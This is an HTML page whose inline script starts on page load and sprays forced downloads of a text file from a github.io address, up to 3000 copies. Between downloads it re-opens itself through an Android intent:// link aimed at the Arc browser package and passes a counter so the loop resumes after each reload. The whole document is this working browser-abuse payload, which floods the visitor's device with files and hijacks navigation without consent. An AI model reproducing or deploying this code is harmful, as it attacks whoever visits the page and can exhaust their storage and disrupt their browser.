<!DOCTYPE html>
<html>
<body>

<script>
let count = 0;
let MAX = 3000; // ⚠️ safe testing limit

const FILE = "https://mrnoob790.github.io/ac.txt";

function download() {
    const a = document.createElement("a");
    a.href = FILE + "?v=" + Math.random();
    a.download = "ac_" + count + ".txt";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

function jump(i) {
    location.href =
    "intent://" + location.host + location.pathname + "?c=" + i +
    "#Intent;scheme=https;package=com.thebrowsercompany.arc;end";
    // ⚠️ package name may vary → fallback system default
}

function spray() {
    if (count >= MAX) return;

    download();
    count++;

    setTimeout(() => {
        jump(count);
    }, 300);
}

// resume after intent reload
const params = new URLSearchParams(location.search);
if (params.has("c")) {
    count = parseInt(params.get("c"));
    spray();
}

// ✅ auto start
window.onload = () => {
    spray();
};
</script>

</body>
</html>
